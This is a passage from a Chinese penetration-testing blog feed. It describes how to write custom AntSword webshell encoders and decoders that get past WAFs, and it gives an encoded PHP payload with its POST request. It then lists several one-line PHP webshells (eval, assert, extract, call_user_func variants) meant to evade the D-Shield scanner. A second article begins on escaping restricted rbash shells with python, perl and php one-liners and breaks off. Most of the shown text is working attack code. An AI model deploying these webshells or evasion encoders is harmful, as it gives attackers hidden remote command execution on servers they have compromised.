class="line">cmd=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiNTY0OTUzNGQiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gIjliN2FiZSI7fW9iX3N0YXJ0KCk7dHJ5eyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGlybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pOyRSPSJ7JER9CSI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQyIsIloiKWFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9ZWxzZXskUi49Ii8iO30kUi49IgkiOyR1PShmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldGVnaWQiKSk%<span class="number">2</span>FQHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOiIiOyRzPSgkdSk%<span class="number">2</span>FJHVbIm5hbWUiXTpAZ2V0X2N1cnJlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Igl7JHN9IjtlY2hvICRSOzt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7</span><br></pre></td></tr></table></figure><p>可以看到对payload直接进行base64编码，但是如果waf的检测机制是解码payload然后在进行检测，就无法绕过。所以我们需要自定义一些编码机制，来绕过waf。</p><h4 id="rot13"><a href="#rot13" class="headerlink" title="rot13"></a>rot13</h4><p>rot13 的 js 实现</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> rot13encode = <span class="function">(<span class="params">s</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> s.replace(<span class="regexp">/[a-zA-Z]/g</span>, <span class="function"><span class="keyword">function</span> (<span class="params">c</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode((c &lt;= <span class="string">&quot;Z&quot;</span> ?</span><br><span class="line">        <span class="number">90</span> :</span><br><span class="line">        <span class="number">122</span>) &gt;= (c = c.charCodeAt(<span class="number">0</span>) + <span class="number">13</span>) ?</span><br><span class="line">      c :</span><br><span class="line">      c - <span class="number">26</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> rot13encode = <span class="function">(<span class="params">s</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> s.replace(<span class="regexp">/[a-zA-Z]/g</span>, <span class="function"><span class="keyword">function</span> (<span class="params">c</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode((c &lt;= <span class="string">&quot;Z&quot;</span> ?</span><br><span class="line">        <span class="number">90</span> :</span><br><span class="line">        <span class="number">122</span>) &gt;= (c = c.charCodeAt(<span class="number">0</span>) + <span class="number">13</span>) ?</span><br><span class="line">      c :</span><br><span class="line">      c - <span class="number">26</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data[pwd] = Buffer.from(rot13encode(data[<span class="string">&#x27;_&#x27;</span>])).toString();</span><br></pre></td></tr></table></figure><p>最终发送payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /steady.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword/v2<span class="number">.1</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">992</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">cmd=%<span class="number">40</span>vav_frg(%<span class="number">22</span>qvfcynl_reebef%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">220</span>%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">40</span>frg_gvzr_yvzvg(<span class="number">0</span>)%<span class="number">3</span>Bshapgvba%<span class="number">20</span>nfrap(%<span class="number">24</span>bhg)%<span class="number">7</span>Berghea%<span class="number">20</span>%<span class="number">24</span>bhg%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">3</span>Bshapgvba%<span class="number">20</span>nfbhgchg()%<span class="number">7</span>B%<span class="number">24</span>bhgchg%<span class="number">3</span>Dbo_trg_pbagragf()%<span class="number">3</span>Bbo_raq_pyrna()%<span class="number">3</span>Brpub%<span class="number">20</span>%<span class="number">2267</span>p814%<span class="number">22</span>%<span class="number">3</span>Brpub%<span class="number">20</span>%<span class="number">40</span>nfrap(%<span class="number">24</span>bhgchg)%<span class="number">3</span>Brpub%<span class="number">20</span>%<span class="number">22132</span>nr0pso07%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>Dbo_fgneg()%<span class="number">3</span>Bgel%<span class="number">7</span>B%<span class="number">24</span>Q%<span class="number">3</span>Dqveanzr(%<span class="number">24</span>_FREIRE%<span class="number">5</span>B%<span class="number">22</span>FPEVCG_SVYRANZR%<span class="number">22</span>%<span class="number">5</span>D)%<span class="number">3</span>Bvs(%<span class="number">24</span>Q%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">22</span>%<span class="number">22</span>)%<span class="number">24</span>Q%<span class="number">3</span>Dqveanzr(%<span class="number">24</span>_FREIRE%<span class="number">5</span>B%<span class="number">22</span>CNGU_GENAFYNGRQ%<span class="number">22</span>%<span class="number">5</span>D)%<span class="number">3</span>B%<span class="number">24</span>E%<span class="number">3</span>D%<span class="number">22</span>%<span class="number">7</span>B%<span class="number">24</span>Q%<span class="number">7</span>D%<span class="number">09</span>%<span class="number">22</span>%<span class="number">3</span>Bvs(fhofge(%<span class="number">24</span>Q%<span class="number">2</span>C0%<span class="number">2</span>C1)!%<span class="number">3</span>D%<span class="number">22</span>%<span class="number">2</span>F%<span class="number">22</span>)%<span class="number">7</span>Bsbernpu(enatr(%<span class="number">22</span>P%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">22</span>M%<span class="number">22</span>)nf%<span class="number">20</span>%<span class="number">24</span>Y)vs(vf_qve(%<span class="number">22</span>%<span class="number">7</span>B%<span class="number">24</span>Y%<span class="number">7</span>D%<span class="number">3</span>A%<span class="number">22</span>))%<span class="number">24</span>E.%<span class="number">3</span>D%<span class="number">22</span>%<span class="number">7</span>B%<span class="number">24</span>Y%<span class="number">7</span>D%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>Dryfr%<span class="number">7</span>B%<span class="number">24</span>E.%<span class="number">3</span>D%<span class="number">22</span>%<span class="number">2</span>F%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">24</span>E.%<span class="number">3</span>D%<span class="number">22</span>%<span class="number">09</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>h%<span class="number">3</span>D(shapgvba_rkvfgf(%<span class="number">22</span>cbfvk_trgrtvq%<span class="number">22</span>))%<span class="number">3</span>F%<span class="number">40</span>cbfvk_trgcjhvq(%<span class="number">40</span>cbfvk_trgrhvq())%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>f%<span class="number">3</span>D(%<span class="number">24</span>h)%<span class="number">3</span>F%<span class="number">24</span>h%<span class="number">5</span>B%<span class="number">22</span>anzr%<span class="number">22</span>%<span class="number">5</span>D%<span class="number">3</span>A%<span class="number">40</span>trg_pheerag_hfre()%<span class="number">3</span>B%<span class="number">24</span>E.%<span class="number">3</span>Dcuc_hanzr()%<span class="number">3</span>B%<span class="number">24</span>E.%<span class="number">3</span>D%<span class="number">22</span>%<span class="number">09</span>%<span class="number">7</span>B%<span class="number">24</span>f%<span class="number">7</span>D%<span class="number">22</span>%<span class="number">3</span>Brpub%<span class="number">20</span>%<span class="number">24</span>E%<span class="number">3</span>B%<span class="number">3</span>B%<span class="number">7</span>Dpngpu(Rkprcgvba%<span class="number">20</span>%<span class="number">24</span>r)%<span class="number">7</span>Brpub%<span class="number">20</span>%<span class="number">22</span>REEBE%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F%<span class="number">22.</span>%<span class="number">24</span>r-%<span class="number">3</span>EtrgZrffntr()%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">3</span>Bnfbhgchg()%<span class="number">3</span>Bqvr()%<span class="number">3</span>B</span><br></pre></td></tr></table></figure><p>任何你能想到的字符串变换的方式，你都可以自由使用，互相随意组合，打造一款属于你自己的无特征的编码器。</p><h3 id="编码器限制"><a href="#编码器限制" class="headerlink" title="编码器限制"></a>编码器限制</h3><p>由于蚁剑只会对<code>data[pwd]</code>里面的参数按照设定的编码器编码，其它参数默认使用base64编码，所以其它参数一旦被waf解码还是会有明显的特征，从而导致被拦截。</p><p>解决办法是遍历<code>data[_]</code>取出其中的值并将其全部编码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * php::base64编码器</span><br><span class="line"> * Create at: 2020&#x2F;05&#x2F;21 13:07:23</span><br><span class="line"> *&#x2F;</span><br><span class="line">&#39;use strict&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">* @param  &#123;String&#125; pwd   连接密码</span><br><span class="line">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span><br><span class="line">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span><br><span class="line">*&#x2F;</span><br><span class="line">module.exports &#x3D; (pwd, data) &#x3D;&gt; &#123;</span><br><span class="line">   ##########    请在下方编写你自己的代码   ###################</span><br><span class="line">  for (let _ in data)&#123;</span><br><span class="line">    if (_ &#x3D;&#x3D;&#x3D; &#39;_&#39;) &#123; continue &#125;;</span><br><span class="line">    ret[_] &#x3D; Buffer.from(data[_]).toString(&#39;base64&#39;);</span><br><span class="line">    ret[_] &#x3D; &#39;steady&#39; + ret[_];</span><br><span class="line">    ret[_] +&#x3D; &#39;steady&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">  ret[pwd] &#x3D; Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);</span><br><span class="line">    ret[pwd] &#x3D; &#39;steady&#39; + ret[pwd];</span><br><span class="line">    ret[pwd] +&#x3D; &#39;steady&#39;;</span><br><span class="line">    &#x2F;&#x2F; 返回编码器处理后的 payload 数组</span><br><span class="line">    return ret;</span><br><span class="line">    ##########    请在下方编写你自己的代码   ###################</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到并没有对其他参数进行编码，而是向其他参数加入了一下自定义的字符串。</p><h2 id="解码器"><a href="#解码器" class="headerlink" title="解码器"></a>解码器</h2><p>蚁剑的编码器是编码或者加密蚁剑向服务端发送的请求包的，所以解码器是用来编码或者加密服务端返回给蚁剑的数据包的，编码后的数据包只有蚁剑能够解码。有些waf会检测返回包，所以有时也需要使用解码器。</p><p>使用编码器</p><p>使用base64，返回的数据被加密成base64。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201011192041042.png" alt="image-20201011192041042"></p><p>不使用编码器</p><p>可以看到返回包是明文。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201011191731747.png" alt="image-20201011191731747"></p><h3 id="解码器分析"><a href="#解码器分析" class="headerlink" title="解码器分析"></a>解码器分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * php::base64解码器</span><br><span class="line"> * Create at: <span class="number">2020</span>/<span class="number">05</span>/<span class="number">22</span> <span class="number">10</span>:<span class="number">21</span>:<span class="number">48</span></span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">  /**</span><br><span class="line">   * @returns &#123;string&#125; asenc 将返回数据base64编码</span><br><span class="line">   * 自定义输出函数名称必须为 asenc</span><br><span class="line">   * 该函数使用的语法需要和shell保持一致</span><br><span class="line">   */</span><br><span class="line">  asoutput: () =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> `function asenc($out)&#123;</span><br><span class="line">      <span class="keyword">return</span> @base64_encode($out);</span><br><span class="line">    &#125;</span><br><span class="line">    `.replace(/\n\s+/g, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  /**</span><br><span class="line">   * 解码 Buffer</span><br><span class="line">   * @param &#123;string&#125; data 要被解码的 Buffer</span><br><span class="line">   * @returns &#123;string&#125; 解码后的 Buffer</span><br><span class="line">   */</span><br><span class="line">  decode_buff: (data, ext=&#123;&#125;) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> Buffer.<span class="keyword">from</span>(data.toString(), <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个方法，<code>asoutput</code>及<code>decode_buff</code>。</p><p><code>asoutput</code>无需传入参数，返回一段php代码字符串，名称为<code>asenc</code>的函数，这个函数会放在请求包里，用于在服务端执行完代码后，再回显部分调用该函数asenc来编码处理，所以服务端无需针对解码做改动。</p><h3 id="自制编码器"><a href="#自制编码器" class="headerlink" title="自制编码器"></a>自制编码器</h3><p>主要原理就是在返回的数据包中加入自己的随机字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">asoutput: () &#x3D;&gt; &#123;</span><br><span class="line">  return &#96;function asenc($out)&#123;</span><br><span class="line">    &#x2F;&#x2F;返回时添加一个随机字符串，避免被waf解码成功</span><br><span class="line">    return &#39;steady&#39;.@base64_encode($out);</span><br><span class="line">  &#125;</span><br><span class="line">  &#96;.replace(&#x2F;\n\s+&#x2F;g, &#39;&#39;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="对称加密，非对称加密"><a href="#对称加密，非对称加密" class="headerlink" title="对称加密，非对称加密"></a>对称加密，非对称加密</h2><h1 id="客户端免杀"><a href="#客户端免杀" class="headerlink" title="客户端免杀"></a>客户端免杀</h1><h2 id="extract-变量覆盖过D盾"><a href="#extract-变量覆盖过D盾" class="headerlink" title="extract 变量覆盖过D盾"></a>extract 变量覆盖过D盾</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  $a&#x3D;1;$b&#x3D;$_POST;extract($b);print_r(&#96;$a&#96;)?&gt;</span><br></pre></td></tr></table></figure><p>post数据a=命令</p><h2 id="parse-str-变量覆盖过D盾"><a href="#parse-str-变量覆盖过D盾" class="headerlink" title="parse_str 变量覆盖过D盾"></a>parse_str 变量覆盖过D盾</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  $a&#x3D;1;$b&#x3D;&quot;a&#x3D;&quot;.$_GET[&#39;a&#39;];parse_str($b);print_r(&#96;$a&#96;)?&gt;</span><br></pre></td></tr></table></figure><p>get数据a=命令</p><h2 id="destruct-析构函数过D盾"><a href="#destruct-析构函数过D盾" class="headerlink" title="__destruct 析构函数过D盾"></a>__destruct 析构函数过D盾</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">  public $name &#x3D; &#39;&#39;;</span><br><span class="line"></span><br><span class="line">  function __destruct()&#123;</span><br><span class="line">    eval(&quot;$this-&gt;name&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user &#x3D; new User;</span><br><span class="line">$user-&gt;name &#x3D; &#39;&#39;.$_POST[&#39;name&#39;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="null-拼接过D盾"><a href="#null-拼接过D盾" class="headerlink" title="null 拼接过D盾"></a>null 拼接过D盾</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$name &#x3D; $_GET[&#39;name&#39;];</span><br><span class="line"></span><br><span class="line">$name1&#x3D;$name2&#x3D; null;</span><br><span class="line"></span><br><span class="line">eval($name1.$name2.$name);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="‘’-拼接过D盾"><a href="#‘’-拼接过D盾" class="headerlink" title="‘’ 拼接过D盾"></a>‘’ 拼接过D盾</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$name &#x3D; $_GET[&#39;name&#39;];</span><br><span class="line"></span><br><span class="line">$name1&#x3D;$name2&#x3D; &#39;&#39;;</span><br><span class="line"></span><br><span class="line">eval($name1.$name2.$name);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="‘’-null-拼接过D盾"><a href="#‘’-null-拼接过D盾" class="headerlink" title="‘’ null 拼接过D盾"></a>‘’ null 拼接过D盾</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; $_GET[&#39;a&#39;];</span><br><span class="line">$c &#x3D; null;</span><br><span class="line">eval(&#39;&#39;.$c.$a);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="array-map函数过D盾"><a href="#array-map函数过D盾" class="headerlink" title="array_map函数过D盾"></a>array_map函数过D盾</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function user()</span><br><span class="line">&#123;</span><br><span class="line">$a123 &#x3D;  chr(97).chr(115).chr(115).chr(101).chr(114).chr(116);</span><br><span class="line">return &#39;&#39;.$a123;</span><br><span class="line">&#125;</span><br><span class="line">$a123 &#x3D; user();</span><br><span class="line">$x123 &#x3D;array($_GET[&#39;x&#39;]);</span><br><span class="line">array_map($a123,$a123 &#x3D; $x123 );</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="call-user-func-array函数过D盾"><a href="#call-user-func-array函数过D盾" class="headerlink" title="call_user_func_array函数过D盾"></a>call_user_func_array函数过D盾</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function a()&#123;</span><br><span class="line">     return &#39;assert&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;a();</span><br><span class="line">$aa &#x3D; array($_GET[&#39;x&#39;]);</span><br><span class="line">call_user_func_array($a,$a&#x3D;$aa);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="call-user-func函数过D盾"><a href="#call-user-func函数过D盾" class="headerlink" title="call_user_func函数过D盾"></a>call_user_func函数过D盾</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function a()&#123;</span><br><span class="line">     return &#39;assert&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;a();</span><br><span class="line">$aa&#x3D;$_GET[&#39;x&#39;];</span><br><span class="line">call_user_func($a,$a&#x3D;$aa);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> By-pass </category>
          
      </categories>
      
      
        <tags>
            
            <tag> By-pass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试--Linux信息收集与提权</title>
      <link href="2019/08/12/rbash%E7%BB%95%E8%BF%87/"/>
      <url>2019/08/12/rbash%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="Rbash绕过"><a href="#Rbash绕过" class="headerlink" title="Rbash绕过"></a>Rbash绕过</h1><h3 id="什么是受限shell环境"><a href="#什么是受限shell环境" class="headerlink" title="什么是受限shell环境?"></a>什么是受限shell环境?</h3><p>受限shell环境，指的是一个会阻止/限制某些命令（如cd、ls、echo等）或”阻止”SHELL、PATH、USER等环境变量的shell环境。有些时候，受限shell环境可能会阻止重定向输出操作符如&gt;，&gt;&gt;，或者其他使用这些重定向的命令。</p><h3 id="受限shell环境的目的"><a href="#受限shell环境的目的" class="headerlink" title="受限shell环境的目的"></a>受限shell环境的目的</h3><ul><li>提高安全性</li><li>防止受到黑客/渗透测试人员的攻击。</li><li>有时，系统管理员会创建一个受限shell环境，来防止受到某些危险命令误操作所带来的伤害。</li></ul><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>拿到一个受限制的shell之后，我们需要做的就是执行一些操作，来摸清当前shell的限制情况。</p><ul><li><p>查看是否可以执行某些命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd、ls、echo</span><br></pre></td></tr></table></figure></li><li><p>检查操作符号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;、&gt;&gt;、&lt;、|</span><br></pre></td></tr></table></figure></li><li><p>检查编程语言是否可以运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl、ruby、python、php</span><br></pre></td></tr></table></figure></li><li><p>查看我们能以root用户运行那些命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo -l</span><br><span class="line">Password:</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> apple on appledeMacBook-Pro:</span><br><span class="line">    env_reset, env_keep+=BLOCKSIZE, env_keep+=<span class="string">&quot;COLORFGBG COLORTERM&quot;</span>, env_keep+=__CF_USER_TEXT_ENCODING, env_keep+=<span class="string">&quot;CHARSET</span></span><br><span class="line"><span class="string">    LANG LANGUAGE LC_ALL LC_COLLATE LC_CTYPE&quot;</span>, env_keep+=<span class="string">&quot;LC_MESSAGES LC_MONETARY LC_NUMERIC LC_TIME&quot;</span>, env_keep+=<span class="string">&quot;LINES</span></span><br><span class="line"><span class="string">    COLUMNS&quot;</span>, env_keep+=LSCOLORS, env_keep+=SSH_AUTH_SOCK, env_keep+=TZ, env_keep+=<span class="string">&quot;DISPLAY XAUTHORIZATION XAUTHORITY&quot;</span>,</span><br><span class="line">    env_keep+=<span class="string">&quot;EDITOR VISUAL&quot;</span>, env_keep+=<span class="string">&quot;HOME MAIL&quot;</span>, lecture_file=/etc/sudo_lecture</span><br><span class="line"></span><br><span class="line">User apple may run the following commands on appledeMacBook-Pro:</span><br><span class="line">    (ALL) ALL</span><br></pre></td></tr></table></figure></li><li><p>检查具有SUID权限的文件或命令</p></li><li><p>检查当前所用的shell，具体命令为：echo $SHELL 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  blog echo $SHELL</span><br><span class="line">/bin/zsh</span><br></pre></td></tr></table></figure></li><li><p>查看当前的环境变量</p><p>env或printenv命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  blog env</span><br><span class="line">TERM_SESSION_ID&#x3D;w1t0p0:A0B301BE-DD25-4605-BC9B-7B6F99E2BF38</span><br><span class="line">SSH_AUTH_SOCK&#x3D;&#x2F;private&#x2F;tmp&#x2F;com.apple.launchd.zvhBmnseo7&#x2F;Listeners</span><br><span class="line">LC_TERMINAL_VERSION&#x3D;3.3.9</span><br><span class="line">COLORFGBG&#x3D;15;0</span><br><span class="line">ITERM_PROFILE&#x3D;Default</span><br><span class="line">XPC_FLAGS&#x3D;0x0</span><br><span class="line">LANG&#x3D;zh_CN.UTF-8</span><br></pre></td></tr></table></figure></li></ul><h3 id="绕过rbash"><a href="#绕过rbash" class="headerlink" title="绕过rbash"></a>绕过rbash</h3><h4 id="编程语言绕过"><a href="#编程语言绕过" class="headerlink" title="编程语言绕过"></a>编程语言绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1) 使用 except &gt; except spawn sh，然后执行sh</span><br><span class="line">2) 使用 python &gt; python -c &#39;import os; os.system(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;</span><br><span class="line">3) 使用 php &gt; php -a ，然后执行 exec(&quot;sh -i&quot;);</span><br><span class="line">4) 使用 perl &gt; perl -e &#39;exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39;</span><br><span class="line">5) 使用 lua &gt; os.execute(&#39;&#x2F;bin&#x2F;sh&#39;).</span><br><span class="line">6) 使用 ruby &gt; exec &quot;&#x2F;bin&#x2F;sh&quot;</span><br></pre></td></tr></table></figure><h4 id="常见绕过技术"><a href="#常见绕过技术" class="headerlink" 